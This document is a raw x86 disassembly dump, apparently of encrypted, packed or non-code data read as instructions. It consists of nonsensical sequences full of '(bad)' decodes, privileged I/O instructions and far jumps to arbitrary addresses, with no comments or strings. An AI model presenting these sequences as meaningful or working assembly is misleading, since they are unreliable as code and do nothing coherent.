  418d66:	mov    eax,0x7f468c9a
  418d6b:	hlt    
  418d6c:	ja     0x418d78
  418d6e:	in     al,dx
  418d6f:	sbb    BYTE PTR [ebx+esi*1+0x2a],0xf4
  418d74:	xchg   ebx,eax
  418d75:	std    
  418d76:	mov    ebp,0x75c744ac
  418d7b:	adc    DWORD PTR ds:0x5f232eaf,esp
  418d81:	xor    DWORD PTR [esi],ebp
  418d83:	test   BYTE PTR [esi-0x18],bh
  418d86:	cmp    esi,DWORD PTR ds:0x1dfa14c8
  418d8c:	dec    edi
  418d8d:	jge    0x418dae
  418d8f:	in     eax,0xa1
  418d91:	mov    WORD PTR [edi+0xb],fs
  418d94:	aam    0x66
  418d96:	add    al,0xd9
  418d98:	test   eax,0x37f716e9
  418d9d:	shl    DWORD PTR [ebp-0x5b],cl
  418da0:	cs or  al,0x29
  418da3:	loopne 0x418dde
  418da5:	or     edi,DWORD PTR [edi+edi*8]
  418da8:	int    0x24
  418daa:	fucomp st(1)
  418dac:	push   ecx
  418dad:	ds jo  0x418db3
  418db0:	pop    ebp
  418db1:	inc    ebp
  418db2:	(bad)  
  418db3:	cmc    
  418db4:	xchg   edi,eax
  418db5:	mov    edi,0x9fea11a3
  418dba:	es and eax,0x5e1ba6fd
  418dc0:	lods   eax,DWORD PTR ds:[esi]
  418dc1:	jge    0x418d67
  418dc3:	push   eax
  418dc4:	arpl   WORD PTR [eax],ax
  418dc6:	ins    DWORD PTR es:[edi],dx
  418dc7:	sbb    edi,DWORD PTR [esi]
  418dc9:	adc    ebx,DWORD PTR [edi+0x238390]
  418dcf:	idiv   DWORD PTR [edx]
  418dd1:	pop    ecx
  418dd2:	mov    ds:0x6415abab,al
  418dd7:	xchg   edi,eax
  418dd8:	push   ebx
  418dd9:	dec    ecx
  418dda:	mov    al,ds:0xcde7f4e
  418ddf:	popa   
  418de0:	pop    es
  418de1:	inc    ecx
  418de2:	es aad 0x2d
  418de5:	ss mov esi,0x648b3cbb
  418deb:	sub    BYTE PTR [edi],dl
  418ded:	pop    ebp
  418dee:	or     BYTE PTR [esi-0x47],0x2a
  418df2:	sbb    eax,0x4608169d
  418df7:	and    dh,BYTE PTR ds:0x27feaaaf
  418dfd:	pop    es
  418dfe:	jb     0x418e1d
  418e00:	dec    edx
  418e01:	ret    
  418e02:	enter  0x7b26,0x41
  418e06:	lods   al,BYTE PTR ds:[esi]
  418e07:	ins    DWORD PTR es:[edi],dx
  418e08:	pop    esi
  418e09:	cdq    
  418e0a:	mov    ebp,0x56b24252
  418e0f:	jno    0x418df2
	...
  418e71:	add    BYTE PTR [eax],al
  418e73:	add    BYTE PTR [esi],cl
  418e75:	bnd call 0xde7c8aab
  418e7b:	dec    dl
  418e7d:	leave  
  418e7e:	and    ah,BYTE PTR [edx-0xd]
  418e81:	es mov bh,0x41
  418e84:	in     eax,0x7
  418e86:	add    DWORD PTR [eax],eax
  418e88:	add    eax,0xab000001
  418e8d:	mov    edx,gs
  418e8f:	push   ss
  418e90:	pop    edi
  418e91:	mov    al,ds:0x1061d326
  418e96:	push   ebp
  418e97:	aad    0x52
  418e99:	cdq    
  418e9a:	cmp    BYTE PTR [esi-0x25f09f51],bh
  418ea0:	or     edx,esp
  418ea2:	dec    ebx
  418ea3:	out    dx,eax
  418ea4:	ja     0x418eec
  418ea6:	aam    0xfa
  418ea8:	pop    ds
  418ea9:	xor    bl,BYTE PTR [esi]
  418eab:	xor    dl,al
  418ead:	stos   BYTE PTR es:[edi],al
  418eae:	cmp    BYTE PTR [esi-0x39],al
  418eb1:	mov    al,ds:0x52e4b31a
  418eb6:	(bad)  
  418eb7:	pop    esi
  418eb8:	call   DWORD PTR [ebx+0x46548c31]
  418ebe:	jnp    0x418e65
  418ec0:	fs dec edi
  418ec2:	adc    esi,edx
  418ec4:	fidivr DWORD PTR [ecx-0x7b]
  418ec7:	xor    ecx,DWORD PTR [edx-0x3fe70fb8]
  418ecd:	(bad)  
  418ece:	fs ja  0x418f3c
  418ed1:	sub    al,0xba
  418ed3:	fnstenv [edi]
  418ed5:	sub    edx,eax
  418ed7:	mov    ah,0x21
  418ed9:	xchg   edx,eax
  418eda:	shl    edi,cl
  418edc:	and    eax,0x36694827
  418ee1:	lock fcom QWORD PTR [esi*8+0x5e6db26e]
  418ee9:	dec    ebp
  418eea:	pop    ds
  418eeb:	ss xor al,ah
  418eee:	push   ss
  418eef:	and    esi,DWORD PTR [edi+0x5b]
  418ef2:	mov    ds:0x9a78373d,al
  418ef7:	je     0x418f60
  418ef9:	out    dx,eax
  418efa:	pop    edx
  418efb:	cdq    
  418efc:	and    BYTE PTR [edx],0x7
  418eff:	mov    cl,0xa0
  418f01:	call   0xe03b:0xfb20a22c
  418f08:	pop    esi
  418f09:	loope  0x418f39
  418f0b:	stc    
  418f0c:	icebp  
  418f0d:	lahf   
  418f0e:	push   edi
  418f0f:	jne    0x418f41
  418f11:	sahf   
  418f12:	bound  ebx,QWORD PTR [ecx-0x7]
  418f15:	sbb    edi,eax
  418f17:	(bad)  
  418f18:	push   0xfffffff9
  418f1a:	xor    DWORD PTR [ecx-0x67],0xa1b3df05
  418f21:	mov    WORD PTR [eax+0x5d],ds
  418f24:	push   ebx
  418f25:	bound  edx,QWORD PTR cs:[edx]
  418f28:	stos   BYTE PTR es:[edi],al
  418f29:	add    eax,0x60746570
  418f2e:	lods   al,BYTE PTR ds:[esi]
  418f2f:	(bad)  
  418f30:	aam    0xcc
  418f32:	shr    BYTE PTR [esi+0x60498dab],cl
  418f38:	push   0xc0127e4c
  418f3d:	push   ss
  418f3e:	sub    DWORD PTR [edi+0x2510af47],0x2e
  418f45:	xor    DWORD PTR [esi+0x69560283],0xffffffae
  418f4c:	ficomp WORD PTR [esi]
  418f4e:	ror    BYTE PTR es:[ebp+0x1f],0x71
  418f53:	cmp    ebp,DWORD PTR [edx+eiz*1]
  418f56:	and    eax,0xcd961d11
  418f5b:	adc    BYTE PTR [edx+0x5950b190],dl
  418f61:	ror    DWORD PTR [edi-0x56],1
  418f64:	xor    eax,0x927420ce
  418f69:	scas   eax,DWORD PTR es:[edi]
  418f6a:	jg     0x418f3e
  418f6c:	inc    esp
  418f6d:	into   
  418f6e:	xor    eax,0x69f8823e
  418f73:	mov    esp,0xa19adbbf
  418f78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f79:	ja     0x418faf
  418f7b:	leave  
  418f7c:	out    0x2e,eax
  418f7e:	cmp    ebx,ebp
  418f80:	in     al,dx
  418f81:	lods   eax,DWORD PTR ds:[esi]
  418f82:	jle    0x418fb9
  418f84:	loopne 0x418f7d
  418f86:	and    al,0xa9
  418f88:	jmp    0xc5c5db1
  418f8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f8e:	inc    eax
  418f8f:	cli    
  418f90:	adc    eax,0x0
	...
  418ff1:	add    BYTE PTR [eax],al
  418ff3:	add    BYTE PTR [edi+edx*4],bl
  418ff6:	in     al,0x47
  418ff8:	out    dx,eax
  418ff9:	ja     0x418fba
  418ffb:	fild   WORD PTR [ecx+0x46eaf1a7]
  419001:	scas   eax,DWORD PTR es:[edi]
  419002:	(bad)  
  419003:	ja     0x418fef
  419005:	or     BYTE PTR [ecx],al
  419007:	add    BYTE PTR ds:0xaa000001,al
  41900d:	imul   eax,DWORD PTR [edi+0x40],0xe08d175e
  419014:	push   ecx
  419015:	js     0x419096
  419017:	push   cs
  419018:	mov    bl,cl
  41901a:	shl    ecx,cl
  41901c:	add    BYTE PTR [esi],ch
  41901e:	sti    
  41901f:	xor    ebp,ebp
  419021:	jge    0x419029
  419023:	scas   eax,DWORD PTR es:[edi]
  419024:	shl    DWORD PTR [ebp-0x50],cl
  419027:	je     0x419032
  419029:	test   BYTE PTR [edi-0xb],ch
  41902c:	cmp    BYTE PTR [ebp+eax*4-0x71],ch
  419030:	(bad)  
  419032:	xor    eax,0x8669e605
  419037:	or     eax,0x9c1fac
  41903c:	xor    bl,al
  41903e:	stc    
  41903f:	mov    ecx,0x433aa728
  419044:	xchg   BYTE PTR [ebp-0xf9be811],al
  41904a:	add    DWORD PTR [eax],0x8b785cf9
  419050:	enter  0x6023,0x15
  419054:	and    ecx,DWORD PTR [edx-0x76ccd7de]
  41905a:	mov    al,0x73
  41905c:	xchg   ebp,eax
  41905d:	ror    DWORD PTR [edi+0x34],cl
  419060:	repnz sub BYTE PTR [edx+0x316c72c9],ch
  419067:	xchg   BYTE PTR [edx-0x21],al
  41906a:	int    0xc7
  41906c:	pop    ecx
  41906d:	loope  0x4190b2
  41906f:	pusha  
  419070:	jae    0x41900c
  419072:	cmp    ebx,DWORD PTR [ecx-0x42]
  419075:	scas   eax,DWORD PTR es:[edi]
  419076:	ror    BYTE PTR [edi-0x1611fd65],cl
  41907c:	(bad)  
  41907d:	es ja  0x419046
  419080:	xlat   BYTE PTR ds:[ebx]
  419081:	jp     0x4190e8
  419083:	test   al,0x32
  419085:	mov    ebp,0x6c2e17e6
  41908a:	xchg   ch,dl
  41908c:	mov    al,0x53
  41908e:	fld    TBYTE PTR [edx+0x3f230772]
  419094:	loop   0x4190fb
  419096:	jle    0x419042
  419098:	shl    BYTE PTR [ebx+0x47],cl
  41909b:	or     eax,0x20ac6956
  4190a0:	jle    0x419091
  4190a2:	sbb    al,0xb4
  4190a4:	dec    ecx
  4190a5:	push   edi
  4190a6:	fadd   DWORD PTR [edx]
  4190a8:	mov    BYTE PTR [ebp+0x342e4721],ch
  4190ae:	in     eax,0xa8
  4190b0:	(bad)  
  4190b1:	lock jb 0x41907a
  4190b4:	inc    edx
  4190b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4190b6:	dec    esp
  4190b7:	adc    eax,0x521874fb
  4190bc:	pop    ss
  4190bd:	lds    ebp,FWORD PTR [ebp+0x614d7ec1]
  4190c3:	mov    eax,ds:0xbdfbd5fd
  4190c8:	jl     0x419121
  4190ca:	inc    esi
  4190cb:	(bad)  
  4190cc:	(bad)  
  4190cd:	arpl   WORD PTR [ebx],bp
  4190cf:	retf   
  4190d0:	push   DWORD PTR [ebx+0x7]
  4190d3:	xchg   esp,eax
  4190d4:	cwde   
  4190d5:	push   eax
  4190d6:	shl    esp,0xfb
  4190d9:	sub    DWORD PTR ds:0xc66a8134,0xb
  4190e0:	mov    esp,0x33925228
  4190e5:	push   cs
  4190e6:	inc    edx
  4190e8:	jmp    0x4190db
  4190ea:	rol    BYTE PTR [ebp-0x39],0x6e
  4190ee:	mov    al,0xab
  4190f0:	shr    eax,0xfa
  4190f3:	ja     0x4190f7
  4190f5:	stc    
  4190f6:	mov    esi,0x6177b9c9
  4190fb:	jle    0x4190bf
  4190fd:	mov    esp,0x3f317d23
  419102:	mov    dl,0x59
  419104:	push   ebx
  419105:	adc    ah,al
  419107:	scas   eax,DWORD PTR es:[edi]
  419108:	adc    bh,bh
  41910a:	in     eax,dx
  41910b:	mov    DWORD PTR [edi+0x35d95077],eax
	...
  419171:	add    BYTE PTR [eax],al
  419173:	add    BYTE PTR [edi-0x41bd617b],ch
  419179:	pop    ebx
  41917a:	(bad)  
  41917b:	in     eax,dx
  41917c:	inc    esi
  41917d:	push   0x4d
  41917f:	or     bl,BYTE PTR [edx+ebx*1-0x61]
  419183:	cmp    ebp,edi
  419185:	or     DWORD PTR [ecx],eax
  419187:	add    BYTE PTR ds:0xef000001,al
  41918d:	mov    ds:0x2721dcc1,eax
  419192:	adc    al,0x7d
  419194:	ss mov edx,0x7db91456
  41919a:	lahf   
  41919b:	sahf   
  41919c:	in     al,0xc7
  41919e:	aam    0x31
  4191a0:	sub    esp,esi
  4191a2:	mov    ah,0xe9
  4191a4:	xor    eax,0xee21d47e
  4191a9:	add    ecx,ecx
  4191ab:	sbb    al,BYTE PTR [ecx+0x1d]
  4191ae:	ins    BYTE PTR es:[edi],dx
  4191af:	sar    DWORD PTR [ebp+0x5ba673ec],cl
  4191b5:	ret    0x984d
  4191b8:	(bad)
  4191bb:	call   0x4316:0x1e43042f
  4191c2:	jno    0x419161
  4191c4:	pop    ecx
  4191c5:	jo     0x41915c
  4191c7:	inc    esp
  4191c8:	dec    edi
  4191c9:	sub    eax,0x359110d7
  4191ce:	mov    BYTE PTR [esi],al
  4191d0:	out    0xdf,al
  4191d2:	mov    BYTE PTR [ecx-0x54],dl
  4191d5:	stc    
  4191d6:	jae    0x41920b
  4191d8:	xor    eax,0x23ec6345
  4191dd:	jl     0x4191c4
  4191df:	add    cl,dh
  4191e1:	in     al,dx
  4191e2:	add    eax,0x531be7c2
  4191e7:	jno    0x4191ed
  4191e9:	push   ebx
  4191ea:	es dec ebp
  4191ec:	pop    es
  4191ed:	imul   ebp,DWORD PTR [edi],0xffffffd7
  4191f0:	(bad)  
  4191f1:	pop    ebx
  4191f2:	imul   esp,DWORD PTR [edx+0x13],0x43498b88
  4191f9:	int    0x97
  4191fb:	dec    esp
  4191fc:	push   edi
  4191fd:	in     eax,dx
  4191fe:	mov    ecx,0x3ea8a87c
  419203:	bound  edx,QWORD PTR [edx]
  419205:	shl    ebx,cl
  419207:	ret    
  419208:	xlat   BYTE PTR ds:[ebx]
  419209:	retf   
  41920a:	dec    edx
  41920b:	and    dh,BYTE PTR [ecx+0x575b21f6]
  419211:	ins    DWORD PTR es:[edi],dx
  419212:	test   al,0x8e
  419214:	bound  edi,QWORD PTR [esi+0x41]
  419217:	data16 xor al,0x6f
  41921a:	adc    dh,BYTE PTR [esi-0xe650628]
  419220:	retf   0xe8ab
  419223:	ficom  DWORD PTR [edx]
  419225:	arpl   WORD PTR [ebp+0x54],cx
  419228:	jle    0x419217
  41922a:	jnp    0x419263
  41922c:	push   ecx
  41922d:	sub    al,0xd9
  41922f:	mov    edx,0xa72d2e3c
  419234:	dec    ebp
  419235:	adc    eax,DWORD PTR [edx]
  419237:	or     BYTE PTR [eax],0x3f
  41923a:	cmp    eax,0x8f35e92
  41923f:	sbb    edx,DWORD PTR [eax]
  419241:	adc    DWORD PTR [esi],ecx
  419243:	dec    eax
  419244:	test   eax,0x158e4d4d
  419249:	dec    edx
  41924a:	(bad)  
  41924c:	fxch   st(4)
  41924e:	retf   
  41924f:	ins    BYTE PTR es:[edi],dx
  419250:	xor    cl,dl
  419252:	cli    
  419253:	das    
  419254:	ret    
  419255:	cmp    edx,DWORD PTR [ecx]
  419257:	mov    ds:0xe527ac67,al
  41925c:	pop    ebp
  41925d:	(bad)  
  41925e:	jl     0x4192ce
  419260:	xchg   ecx,eax
  419261:	retf   0x1884
  419264:	push   esi
  419265:	fwait
  419266:	pushf  
  419267:	in     al,0xb0
  419269:	outs   dx,DWORD PTR ds:[esi]
  41926a:	jb     0x419284
  41926c:	lods   al,BYTE PTR ds:[esi]
  41926d:	iret   
  41926e:	outs   dx,BYTE PTR ds:[esi]
  41926f:	inc    esp
  419270:	jo     0x41927d
  419272:	(bad)  
  419273:	pusha  
  419274:	jg     0x419254
  419276:	jle    0x419223
  419278:	loop   0x419297
  41927a:	pop    ds
  41927b:	push   ebp
  41927c:	pop    esi
  41927d:	icebp  
  41927e:	(bad)  
  41927f:	push   ss
  419280:	dec    edx
  419281:	cmp    ebp,DWORD PTR [edx+edx*4-0x70]
  419285:	and    al,BYTE PTR [eax-0x7e]
  419288:	and    eax,0xaf737d97
  41928d:	loop   0x4192eb
  41928f:	(bad)  
	...
  4192f1:	add    BYTE PTR [eax],al
  4192f3:	add    BYTE PTR [eax-0xcc4519],ah
  4192f9:	jg     0x4192a4
  4192fb:	neg    eax
  4192fd:	pop    ss
  4192fe:	daa    
  4192ff:	inc    edi
  419300:	pop    ebx
  419301:	icebp  
  419302:	adc    cl,BYTE PTR [ebp-0xc]
  419305:	or     al,BYTE PTR [ecx]
  419307:	add    BYTE PTR ds:0xb7000001,al
  41930d:	(bad)  
  41930e:	lods   eax,DWORD PTR ds:[esi]
  41930f:	std    
  419310:	lea    esi,[edx-0x40cde9ec]
  419316:	mov    edx,0x73c4e32c
  41931b:	int3   
  41931c:	adc    ebp,0xffffffcc
  41931f:	lock stc 
  419321:	sahf   
  419322:	popa   
  419323:	leave  
  419324:	xor    eax,0xdb9ff293
  419329:	ret    
  41932a:	sahf   
  41932b:	mov    esp,0x7ac09588
  419330:	shl    esi,1
  419332:	lds    edi,FWORD PTR [edx+0x11623ae9]
  419338:	clc    
  419339:	(bad)  
  41933b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41933c:	mov    al,0x44
  41933f:	jnp    0x4192d6
  419341:	ret    
  419342:	loop   0x419379
  419344:	sti    
  419345:	lea    ebp,[ebp-0x146989f]
  41934b:	fist   WORD PTR [ecx]
  41934d:	cmc    
  41934e:	imul   esi,DWORD PTR [edi],0xfffffff5
  419351:	sahf   
  419352:	jbe    0x4193bf
  419354:	leave  
  419355:	stos   BYTE PTR es:[edi],al
  419356:	dec    ecx
  419357:	jnp    0x4193d5
  419359:	push   esi
  41935a:	mov    esp,0xfd3c35d6
  41935f:	fmul   DWORD PTR [esi]
  419361:	jl     0x41936c
  419363:	loop   0x41932b
  419365:	enter  0x9e40,0xdc
  419369:	mov    esp,0x872b3c1d
  41936e:	push   ds
  41936f:	outs   dx,BYTE PTR ds:[esi]
  419370:	test   DWORD PTR [edi],edi
  419372:	add    cl,BYTE PTR [eax-0x6d4ad5ae]
  419378:	mov    edi,0xc437c1e6
  41937d:	arpl   WORD PTR [ebp+0xa],sp
  419380:	jno    0x4193a1
  419382:	int    0xee
  419384:	outs   dx,DWORD PTR ds:[esi]
  419385:	mov    ebp,DWORD PTR [edi-0x4a776ee5]
  41938b:	stos   BYTE PTR es:[edi],al
  41938c:	jnp    0x4193c8
  41938e:	jno    0x4193a4
  419390:	add    eax,DWORD PTR [eax-0xd]
  419393:	test   BYTE PTR [eax+ebp*2],al
  419396:	fsub   DWORD PTR [esi+0x7fc08245]
  41939c:	cmp    DWORD PTR [esi],edx
  41939e:	out    0xdf,eax
  4193a0:	and    ebx,edx
  4193a2:	pushf  
  4193a3:	jb     0x41938c
  4193a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4193a6:	scas   al,BYTE PTR es:[edi]
  4193a7:	enter  0x30c,0x46
  4193ab:	(bad)  
  4193ac:	add    dh,dh
  4193ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193af:	out    0x1,eax
  4193b1:	movsx  eax,WORD PTR [ecx]
  4193b4:	xlat   BYTE PTR ds:[ebx]
  4193b5:	fisttp DWORD PTR [edi]
  4193b7:	sub    eax,0x60b2c0ed
  4193bc:	cs jmp 0x419348
  4193bf:	sbb    al,0xf2
  4193c1:	nop
  4193c2:	push   ds
  4193c3:	enter  0xd132,0x9
  4193c7:	aaa    
  4193c8:	xchg   bh,cl
  4193ca:	cmp    edx,DWORD PTR [eax-0x25]
  4193cd:	out    dx,eax
  4193ce:	ja     0x419403
  4193d0:	daa    
  4193d1:	addr16 out 0x55,al
  4193d4:	js     0x419414
  4193d6:	pop    edx
  4193d7:	call   0xa590:0x1e383ee5
  4193de:	push   ebx
  4193df:	inc    esi
  4193e0:	and    esp,DWORD PTR [edx+esi*4+0x51165090]
  4193e7:	ret    
  4193e8:	test   eax,0xa76fafc3
  4193ed:	adc    bl,0x8f
  4193f0:	sbb    cl,dl
  4193f2:	xor    DWORD PTR [edx],ebx
  4193f4:	dec    ebx
  4193f5:	cmc    
  4193f6:	cmc    
  4193f7:	xchg   ebp,eax
  4193f8:	in     al,0xda
  4193fa:	mov    bl,0xa6
  4193fc:	jno    0x41940c
  4193fe:	mov    cl,BYTE PTR [esi]
  419400:	cmp    al,0x9d
  419402:	push   cs
  419403:	sldt   ebx
  419406:	mov    al,ds:0x67ea1ec4
  41940b:	mov    dl,0x57
  41940d:	push   edx
  41940e:	xchg   ebp,eax
  41940f:	sub    edx,DWORD PTR [ebx]
	...
  419471:	add    BYTE PTR [eax],al
  419473:	add    BYTE PTR ds:0xed3a6998,bh
  419479:	sti    
  41947a:	jg     0x41941b
  41947c:	cmp    ebx,esi
  41947e:	je     0x419446
  419480:	outs   dx,DWORD PTR ds:[esi]
  419481:	retf   
  419482:	adc    DWORD PTR [edi-0x7],esp
  419485:	or     eax,DWORD PTR [ecx]
  419487:	add    BYTE PTR ds:0xd3000001,al
  41948d:	xor    cl,ch
  41948f:	jo     0x4194fe
  419491:	push   ebp
  419492:	in     eax,0x2a
  419494:	cli    
  419495:	imul   esp,DWORD PTR [ebx+0x3b],0xffffffa1
  419499:	loop   0x419425
  41949b:	nop
  41949c:	ss mov cl,0xa6
  41949f:	aaa    
  4194a0:	daa    
  4194a1:	mov    WORD PTR [esi+0x5921244],?
  4194a7:	xor    eax,ebx
  4194a9:	fiadd  DWORD PTR [ebx-0x3f7d7b66]
  4194af:	call   0x7f9b:0x562c6b11
  4194b6:	jge    0x4194f9
  4194b8:	je     0x4194c9
  4194ba:	loopne 0x4194e0
  4194bc:	xor    al,0xcf
  4194be:	dec    ecx
  4194bf:	sbb    BYTE PTR [eax+0x5415ef5d],dl
  4194c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4194c6:	adc    DWORD PTR [esi],esp
  4194c8:	ins    BYTE PTR es:[edi],dx
  4194c9:	pop    ebp
  4194ca:	fucomp st(1)
  4194cc:	pop    ds
  4194cd:	mov    bl,0x54
  4194cf:	iret   
  4194d0:	push   eax
  4194d1:	(bad)  
  4194d2:	iret   
  4194d3:	stc    
  4194d4:	(bad)  
  4194d5:	dec    esi
  4194d6:	shl    DWORD PTR [esi+0x38],1
  4194d9:	jle    0x419463
  4194db:	retf   0xa154
  4194de:	or     ch,BYTE PTR [ecx-0x6170d199]
  4194e4:	or     BYTE PTR [ecx+0x48eb948c],cl
  4194ea:	imul   edi,ebx,0x71
  4194ed:	into   
  4194ee:	cwde   
  4194ef:	jnp    0x419535
  4194f1:	sbb    ebp,edi
  4194f3:	and    dh,BYTE PTR cs:[eax]
  4194f6:	arpl   WORD PTR [ebp+esi*1+0x417667d5],di
  4194fd:	(bad)  
  4194ff:	adc    BYTE PTR [edx+0xf],ch
  419502:	test   BYTE PTR [esi+0x3c],ch
  419505:	fwait
  419506:	(bad)  
  419507:	sub    al,0xd6
  419509:	fsubr  DWORD PTR [esi+edx*2-0x646b9361]
  419510:	xlat   BYTE PTR ds:[ebx]
  419511:	gs ins DWORD PTR es:[edi],dx
  419513:	push   ss
  419514:	mov    esi,0x60ba2dd2
  419519:	cmp    BYTE PTR [edi],dl
  41951b:	(bad)  
  41951c:	or     esp,DWORD PTR [edx]
  41951e:	sbb    BYTE PTR [ebx+0xc579bbb],ch
  419524:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419525:	or     eax,DWORD PTR [ecx+ecx*1+0x48]
  419529:	inc    ecx
  41952a:	jo     0x419533
  41952c:	push   esp
  41952d:	(bad)  
  41952e:	repz pop esi
  419530:	gs inc esi
  419532:	push   ebx
  419533:	xchg   DWORD PTR [edi+0x32],ebp
  419536:	not    BYTE PTR [edx+0x5ba466b4]
  41953c:	mov    bh,BYTE PTR [ebx+0x4ebf47d0]
  419542:	jo     0x4194c7
  419544:	popf   
  419545:	and    BYTE PTR [ebx-0x5c],cl
  419548:	xchg   edx,eax
  419549:	test   BYTE PTR [ebx+0x40],ch
  41954c:	shr    DWORD PTR [esi-0x24],0x77
  419550:	xchg   ebp,eax
  419551:	cwde   
  419552:	cwde   
  419553:	mov    edx,0x59e50e82
  419558:	pop    edi
  419559:	fisttp QWORD PTR [esi-0x3a855715]
  41955f:	cmp    DWORD PTR [edx+0x3094282d],edi
  419565:	or     BYTE PTR [ebx+0x142e110d],bl
  41956b:	pop    esp
  41956c:	ret    0xa844
  41956f:	and    edx,DWORD PTR [ebp+0x3]
  419572:	or     BYTE PTR [ebp+0x602a8567],bh
  419578:	add    ch,bh
  41957a:	xchg   ebx,eax
  41957b:	lea    edx,[edx]
  41957d:	ds mov edi,0x154d221b
  419583:	les    edx,FWORD PTR [ebx+0x54]
  419586:	mov    ch,BYTE PTR [ecx+ecx*1-0xade695]
  41958d:	xor    bh,cl
  41958f:	and    ebx,edx
	...
  4195f1:	add    BYTE PTR [eax],al
  4195f3:	add    BYTE PTR [edi-0x9d722c],ch
  4195f9:	jnp    0x4195ea
  4195fb:	fstp   st(1)
  4195fd:	fcomp  QWORD PTR [ebx+0x2f]
  419600:	daa    
  419601:	mov    ah,0x54
  419603:	inc    ebx
  419604:	dec    BYTE PTR [ecx+eax*1]
  419607:	add    BYTE PTR ds:0x10000001,al
  41960d:	sub    ecx,ecx
  41960f:	dec    eax
  419610:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419611:	fldcw  WORD PTR [edi-0x10ce8e1f]
  419617:	xchg   bh,cl
  419619:	imul   ebx,ecx,0xffffffe4
  41961c:	sub    esp,esi
  41961e:	loop   0x419688
  419620:	dec    ecx
  419621:	ins    DWORD PTR es:[edi],dx
  419622:	mov    al,BYTE PTR [eax+eiz*2]
  419625:	mov    dl,0xa2
  419627:	mov    esi,0x3cf8aed2
  41962c:	stos   DWORD PTR es:[edi],eax
  41962d:	mov    bh,0x8a
  41962f:	shl    BYTE PTR [edi+0x3e],1
  419632:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419633:	jecxz  0x4195f1
  419635:	lock sub al,al
  419638:	jecxz  0x4195ce
  41963a:	xor    ebx,DWORD PTR [esi+0x6c208dbc]
  419640:	sbb    BYTE PTR [ebx+0x208f3f1a],al
  419646:	into   
  419647:	sbb    eax,0xf04d8982
  41964c:	lahf   
  41964d:	pop    edi
  41964e:	xor    bh,0x5b
  419651:	inc    ecx
  419652:	enter  0x6502,0x99
  419656:	mov    ?,ebx
  419658:	pop    edi
  419659:	mov    cs,WORD PTR [eax+0x3433ac1a]
  41965f:	aam    0x73
  419661:	fisubr DWORD PTR [edi+0x29c6d2b8]
  419667:	fwait
  419668:	sbb    al,0xc4
  41966a:	jle    0x419618
  41966c:	mov    bh,0x9e
  41966e:	shl    BYTE PTR [edx],1
  419670:	in     eax,dx
  419671:	fidivr WORD PTR gs:[ebx+edi*4-0x214a45ae]
  419679:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41967a:	gs out 0x9a,al
  41967d:	and    DWORD PTR [eax],edi
  41967f:	push   ds
  419680:	ja     0x4196c1
  419682:	jmp    0xf469:0xce051c40
  419689:	das    
  41968a:	loopne 0x419692
  41968c:	pop    esp
  41968d:	cmp    DWORD PTR [ecx+0x6b3939b7],ecx
  419693:	sahf   
  419694:	jmp    0xf517:0x7f4ac936
  41969b:	jge    0x4196be
  41969d:	sbb    eax,0x8c9f513a
  4196a2:	sbb    DWORD PTR [edx+0x381efed],0x477bb2c2
  4196ac:	retf   
  4196ad:	(bad)  
  4196ae:	cli    
  4196af:	cmp    ch,BYTE PTR [esi+0x46]
  4196b2:	sbb    BYTE PTR [ebp+ebx*4-0x6846e40],ch
  4196b9:	retf   0x79ae
  4196bc:	lds    esi,FWORD PTR [edi-0x7b]
  4196bf:	push   ebp
  4196c0:	mov    ds:0x6114edd3,eax
  4196c5:	lea    ebx,[ecx+edi*8]
  4196c8:	adc    BYTE PTR [ecx],cl
  4196ca:	and    al,BYTE PTR [ebp-0x56f731b9]
  4196d0:	mov    WORD PTR [ebx-0x681f2311],fs
  4196d6:	sub    edx,edx
  4196d8:	jmp    0xc876011e
  4196dd:	popa   
  4196de:	scas   eax,DWORD PTR es:[edi]
  4196df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196e0:	outs   dx,BYTE PTR ds:[esi]
  4196e1:	and    BYTE PTR [ecx+ecx*2+0x10],0x83
  4196e6:	pop    edx
  4196e7:	arpl   WORD PTR [ecx+0x5f],ax
  4196ea:	in     al,0x4e
  4196ec:	fadd   st,st(3)
  4196ee:	xchg   esp,eax
  4196ef:	sub    DWORD PTR [ebx-0x2b],esi
  4196f2:	xchg   ebx,eax
  4196f3:	xor    ecx,DWORD PTR [ecx-0x41]
  4196f6:	and    al,0x5e
  4196f8:	add    edi,DWORD PTR [edx-0x52]
  4196fb:	cmp    BYTE PTR [ebx-0x7ba58e79],dl
  419701:	and    ch,BYTE PTR [edi]
  419703:	jge    0x4196f7
  419705:	push   ss
  419706:	mov    esp,0xdc53aaa1
  41970b:	adc    DWORD PTR [edi],esi
  41970d:	xor    DWORD PTR [edx+ebp*1],ebp
  419710:	out    0x0,eax
	...
  419772:	add    BYTE PTR [eax],al
  419774:	mov    bl,0x3f
  419776:	jno    0x4197dd
  419778:	std    
  419779:	outs   dx,DWORD PTR ds:[esi]
  41977a:	mov    bh,0xff
  41977c:	add    eax,0x918dd0ae
  419781:	in     al,dx
  419782:	addr16 xchg ecx,eax
  419784:	add    ecx,DWORD PTR [esi]
  419786:	add    DWORD PTR [eax],eax
  419788:	add    eax,0x21000001
  41978d:	je     0x4197dc
  41978f:	inc    esp
  419790:	xchg   edi,eax
  419791:	jecxz  0x4197e1
  419793:	js     0x41979d
  419795:	xlat   BYTE PTR ds:[ebx]
  419796:	adc    ah,bl
  419798:	loop   0x4197f1
  41979a:	stos   BYTE PTR es:[edi],al
  41979b:	rcl    BYTE PTR [edi],1
  41979d:	pop    es
  41979e:	xchg   ecx,eax
  41979f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4197a0:	xor    al,0xd5
  4197a2:	xor    ah,BYTE PTR [ebx-0x2f]
  4197a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4197a6:	sahf   
  4197a7:	fidivr DWORD PTR [esi+0x2f]
  4197aa:	mov    ecx,0x9141a472
  4197af:	arpl   WORD PTR [esi+esi*1],ax
  4197b2:	in     al,0xcf
